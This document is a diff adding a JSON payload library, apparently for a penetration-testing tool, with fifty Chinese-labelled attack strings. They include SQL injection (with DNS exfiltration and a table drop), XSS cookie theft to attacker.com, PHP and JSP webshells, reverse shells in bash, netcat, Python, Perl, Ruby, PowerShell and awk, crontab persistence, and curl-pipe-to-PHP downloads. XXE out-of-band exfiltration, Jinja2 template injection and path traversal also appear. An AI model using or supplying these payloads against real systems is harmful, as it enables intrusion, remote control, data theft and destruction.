@@ -1,0 +1,484 @@
+[
+    {
+        "id": 1,
+        "name": "ORDER BY列数判断",
+        "content": "1' ORDER BY {n} -- ",
+        "category": "sql",
+        "tags": [
+            "列数探测",
+            "SQL注入"
+        ],
+        "description": "确定查询结果列数（测试起点）"
+    },
+    {
+        "id": 2,
+        "name": "联合查询显示位",
+        "content": "union select 1,user(),3",
+        "category": "sql",
+        "tags": [
+            "联合查询",
+            "显示位"
+        ]
+    },
+    {
+        "id": 3,
+        "name": "爆当前数据库名",
+        "content": "union select 1,database(),3,4",
+        "category": "sql",
+        "tags": [
+            "数据库信息",
+            "联合查询"
+        ]
+    },
+    {
+        "id": 4,
+        "name": "爆数据库版本",
+        "content": "union select 1,@@version,3,4",
+        "category": "sql",
+        "tags": [
+            "版本信息",
+            "联合查询"
+        ]
+    },
+    {
+        "id": 5,
+        "name": "爆所有数据库名",
+        "content": "union select 1,group_concat(schema_name),3,4 from information_schema.schemata",
+        "category": "sql",
+        "tags": [
+            "数据库枚举",
+            "联合查询"
+        ]
+    },
+    {
+        "id": 6,
+        "name": "爆当前数据库用户",
+        "content": "union select 1,current_user(),3,4",
+        "category": "sql",
+        "tags": [
+            "用户信息",
+            "联合查询"
+        ]
+    },
+    {
+        "id": 7,
+        "name": "爆数据库路径",
+        "content": "union select 1,@@datadir,3,4",
+        "category": "sql",
+        "tags": [
+            "路径信息",
+            "联合查询"
+        ]
+    },
+    {
+        "id": 8,
+        "name": "联合查询表名",
+        "content": "union select 1,2.group_concat(table_name) from information_schema.tables where table_schema=database()",
+        "category": "sql",
+        "tags": [
+            "联合查询",
+            "表名"
+        ]
+    },
+    {
+        "id": 9,
+        "name": "联合查询数据",
+        "content": "union select 1,username,password from 'key' --+",
+        "category": "sql",
+        "tags": [
+            "联合查询",
+            "数据"
+        ]
+    },
+    {
+        "id": 10,
+        "name": "万能密码",
+        "content": "admin' or '1'='1",
+        "category": "sql",
+        "tags": [
+            "登录绕过"
+        ]
+    },
+    {
+        "id": 11,
+        "name": "布尔盲注",
+        "content": "and length(database())=4 --+",
+        "category": "sql",
+        "tags": [
+            "布尔盲注"
+        ]
+    },
+    {
+        "id": 12,
+        "name": "时间盲注",
+        "content": "or if(ascii(substr(database(),1,1))>0,sleep(1),1) --+",
+        "category": "sql",
+        "tags": [
+            "时间盲注"
+        ]
+    },
+    {
+        "id": 13,
+        "name": "floor报错注入",
+        "content": "select * from test where id=1 and (select 1 from (select count(*),concat(user(), floor(rand(0)*2))x from information_schema.tables group by x)a)",
+        "category": "sql",
+        "tags": [
+            "报错注入"
+        ]
+    },
+    {
+        "id": 14,
+        "name": "extractvalue报错注入",
+        "content": "select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))",
+        "category": "sql",
+        "tags": [
+            "报错注入"
+        ]
+    },
+    {
+        "id": 15,
+        "name": "updatexml报错注入",
+        "content": "and updatexml(1,concat(0x7e,(select @@version),0x7e),1)",
+        "category": "sql",
+        "tags": [
+            "报错注入",
+            "版本信息"
+        ]
+    },
+    {
+        "id": 16,
+        "name": "DNS带外查询",
+        "content": "union select load_file(concat('\\\\',(select database()),'.attacker.com\\abc'))",
+        "category": "sql",
+        "tags": [
+            "OOB注入",
+            "数据外带"
+        ]
+    },
+    {
+        "id": 17,
+        "name": "堆叠注入",
+        "content": "'; drop table users; --",
+        "category": "sql",
+        "tags": [
+            "堆叠注入"
+        ]
+    },
+    {
+        "id": 18,
+        "name": "基本弹窗XSS",
+        "content": "<script>alert('XSS')</script>",
+        "category": "xss",
+        "tags": [
+            "基础XSS",
+            "弹窗"
+        ]
+    },
+    {
+        "id": 19,
+        "name": "onerror事件XSS",
+        "content": "<img src=1 onerror=alert('XSS')>",
+        "category": "xss",
+        "tags": [
+            "事件处理器"
+        ]
+    },
+    {
+        "id": 20,
+        "name": "SVG向量XSS",
+        "content": "<svg onload=alert('XSS')>",
+        "category": "xss",
+        "tags": [
+            "SVG"
+        ]
+    },
+    {
+        "id": 21,
+        "name": "JavaScript伪协议",
+        "content": "\" onfocus=alert(1) autofocus=\"",
+        "category": "xss",
+        "tags": [
+            "事件注入"
+        ]
+    },
+    {
+        "id": 22,
+        "name": "Data协议XSS",
+        "content": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+        "category": "xss",
+        "tags": [
+            "Data协议"
+        ]
+    },
+    {
+        "id": 23,
+        "name": "编码绕过XSS",
+        "content": "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">",
+        "category": "xss",
+        "tags": [
+            "编码绕过"
+        ]
+    },
+    {
+        "id": 24,
+        "name": "SVG动态脚本",
+        "content": "<svg><script>alert('XSS')</script></svg>",
+        "category": "xss",
+        "tags": [
+            "SVG向量"
+        ]
+    },
+    {
+        "id": 25,
+        "name": "Cookie窃取XSS",
+        "content": "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
+        "category": "xss",
+        "tags": [
+            "持久化XSS",
+            "数据窃取"
+        ]
+    },
+    {
+        "id": 26,
+        "name": "基本命令执行",
+        "content": "| whoami",
+        "category": "rce",
+        "tags": [
+            "命令注入",
+            "基本"
+        ]
+    },
+    {
+        "id": 27,
+        "name": "多命令执行",
+        "content": "cat /etc/passwd; id; w",
+        "category": "rce",
+        "tags": [
+            "命令拼接"
+        ]
+    },
+    {
+        "id": 28,
+        "name": "反引号RCE",
+        "content": "echo `whoami`",
+        "category": "rce",
+        "tags": [
+            "命令替换"
+        ]
+    },
+    {
+        "id": 29,
+        "name": "PHP一句话木马",
+        "content": "<?php @eval($_POST['cmd']); ?>",
+        "category": "webshell",
+        "tags": [
+            "文件上传",
+            "后门"
+        ]
+    },
+    {
+        "id": 30,
+        "name": "Apache解析绕过",
+        "content": "AddType application/x-httpd-php .jpg",
+        "category": "webshell",
+        "tags": [
+            "解析漏洞"
+        ]
+    },
+    {
+        "id": 31,
+        "name": "Echo写入Shell",
+        "content": "echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/shell.php",
+        "category": "webshell",
+        "tags": [
+            "文件写入"
+        ]
+    },
+    {
+        "id": 32,
+        "name": "JSP webshell",
+        "content": "<%@ page import=\"java.util.*,java.io.*\"%>\n<%\nif(request.getParameter(\"cmd\")!=null) {\n    Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n    OutputStream os = p.getOutputStream();\n    InputStream in = p.getInputStream();\n    DataInputStream dis = new DataInputStream(in);\n    String disr = dis.readLine();\n    while(disr != null) {\n        out.println(disr);\n        disr = dis.readLine();\n    }\n}\n%>",
+        "category": "webshell",
+        "tags": [
+            "JSP",
+            "命令执行"
+        ]
+    },
+    {
+        "id": 33,
+        "name": "PHP反弹Shell",
+        "content": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "category": "getshell",
+        "tags": [
+            "PHP",
+            "反弹Shell"
+        ]
+    },
+    {
+        "id": 34,
+        "name": "CURL下载执行",
+        "content": "curl http://attacker.com/shell.txt | php",
+        "category": "getshell",
+        "tags": [
+            "远程下载"
+        ]
+    },
+    {
+        "id": 35,
+        "name": "Telnet反弹Shell",
+        "content": "telnet {ip} {port} | /bin/bash | telnet {ip} {port+1}",
+        "category": "getshell",
+        "tags": [
+            "Telnet",
+            "双向通道"
+        ]
+    },
+    {
+        "id": 36,
+        "name": "Crontab定时反弹",
+        "content": "echo '* * * * * bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"' | crontab -",
+        "category": "getshell",
+        "tags": [
+            "Crontab",
+            "定时任务"
+        ]
+    },
+    {
+        "id": 37,
+        "name": "Python反弹Shell",
+        "content": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+        "category": "getshell",
+        "tags": [
+            "Python",
+            "全双工"
+        ]
+    },
+    {
+        "id": 38,
+        "name": "Netcat传统反弹",
+        "content": "nc -e /bin/sh {ip} {port}",
+        "category": "getshell",
+        "tags": [
+            "Netcat",
+            "基础"
+        ]
+    },
+    {
+        "id": 39,
+        "name": "Netcat无-e参数版",
+        "content": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
+        "category": "getshell",
+        "tags": [
+            "Netcat",
+            "管道技巧"
+        ]
+    },
+    {
+        "id": 40,
+        "name": "Bash反弹Shell",
+        "content": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+        "category": "getshell",
+        "tags": [
+            "Bash",
+            "原生支持"
+        ]
+    },
+    {
+        "id": 41,
+        "name": "Socat高级反弹",
+        "content": "socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
+        "category": "getshell",
+        "tags": [
+            "Socat",
+            "TTY分配"
+        ]
+    },
+    {
+        "id": 42,
+        "name": "Perl反弹Shell",
+        "content": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+        "category": "getshell",
+        "tags": [
+            "Perl",
+            "跨平台"
+        ]
+    },
+    {
+        "id": 43,
+        "name": "Ruby反弹Shell",
+        "content": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+        "category": "getshell",
+        "tags": [
+            "Ruby",
+            "稳定连接"
+        ]
+    },
+    {
+        "id": 44,
+        "name": "Powershell反弹",
+        "content": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+        "category": "getshell",
+        "tags": [
+            "Powershell",
+            "Windows"
+        ]
+    },
+    {
+        "id": 45,
+        "name": "AWK反弹Shell",
+        "content": "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
+        "category": "getshell",
+        "tags": [
+            "AWK",
+            "非常规方式"
+        ]
+    },
+    {
+        "id": 46,
+        "name": "XXE基础文件读取",
+        "content": "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><test>&xxe;</test>",
+        "category": "xxe",
+        "tags": [
+            "文件读取"
+        ]
+    },
+    {
+        "id": 47,
+        "name": "XXE OOB攻击",
+        "content": "<!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">%remote;%payload;",
+        "category": "xxe",
+        "tags": [
+            "OOB",
+            "数据外带"
+        ]
+    },
+    {
+        "id": 48,
+        "name": "Java反序列化Payload",
+        "content": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAABh3CAAAACAAAAAB",
+        "category": "deserialization",
+        "tags": [
+            "Java"
+        ]
+    },
+    {
+        "id": 49,
+        "name": "Jinja2 RCE",
+        "content": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
+        "category": "ssti",
+        "tags": [
+            "模板注入",
+            "命令执行"
+        ]
+    },
+    {
+        "id": 50,
+        "name": "Linux路径遍历",
+        "content": "../../../../../../etc/passwd",
+        "category": "lfi",
+        "tags": [
+            "目录穿越",
+            "文件读取"
+        ]
+    }
+]
